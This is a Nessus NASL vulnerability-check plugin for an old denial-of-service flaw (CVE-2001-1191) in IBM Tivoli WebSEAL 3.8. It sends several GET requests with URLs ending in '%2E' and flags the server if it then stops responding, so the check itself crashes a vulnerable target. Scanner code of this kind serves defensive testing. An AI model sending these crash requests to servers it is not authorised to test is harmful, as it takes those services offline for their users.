#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CAN
#
# References:
# Date:  11 Dec 2001 09:22:50 -0000
# From: "Matthew Lane" <MatthewL@Janusassociates.com>
# To: bugtraq@securityfocus.com
# Subject: Webseal 3.8
#
# Affected:
# Webseal 3.8
#
# *unconfirmed*

include( 'compat.inc' );

if(description)
{
  script_id(11089);
  script_version ("$Revision: 1.18 $");
  script_cve_id("CVE-2001-1191");
  script_bugtraq_id(3685);
  script_xref(name:"OSVDB", value:"2089");

  script_name(english:"IBM Tivoli SecureWay WebSEAL Proxy Policy Director Encoded URL DoS");
  script_summary(english:"Request ending with %2E kills WebSeal");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to a denial of service attack.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The remote web server crashes when an URL ending with %2E is requested.

An attacker may use this flaw to make your server crash continually."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Upgrade to IBM Tivoli SecureWay Policy Director 3.9 or later."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://archives.neohapsis.com/archives/bugtraq/2002-04/0223.html'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");
  script_dependencie("find_service1.nasl", "httpver.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (! can_host_asp(port:port)) exit(0);

if (http_is_dead(port: port)) exit(0);

url[0] = "/index.html";
url[1] = "/index.htm";
url[2] = "/index.asp";
url[3] = "/";

for (i=0; i<4;i=i+1)
{
 w = http_send_recv3(method:"GET", port: port, item: string(url[i], "%2E"));
 if (isnull(w)) break;
}
# We must close the socket, VNC limits the number of parallel connections
http_disable_keep_alive();

if (http_is_dead(port: port)) { security_warning(port); }
